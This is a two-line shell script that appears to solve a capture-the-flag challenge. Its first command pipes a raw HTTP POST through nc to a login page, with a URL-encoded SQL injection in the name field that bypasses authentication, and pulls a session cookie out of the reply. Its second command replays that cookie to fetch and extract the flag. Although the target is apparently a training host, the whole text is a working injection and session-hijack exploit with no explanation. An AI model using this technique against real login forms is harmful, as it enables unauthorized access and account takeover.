cook=`echo -e "POST /login.php HTTP/1.1\r\nHost: 10.0.254.15\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 51\r\n\r\nname=1%27+or+cookie%21%3D%27%27+limit+1%3B%23&pswd=\r\n" | nc sibears.ru 5555 | grep 'cook=' | cut --bytes 18-27`
echo -e "GET /index.php HTTP/1.1\r\nHost: sibears.ru\r\nCookie: cook=$cook\r\n\r\n" | nc sibears.ru 5555 | grep 'flag' | cut --bytes 28-47
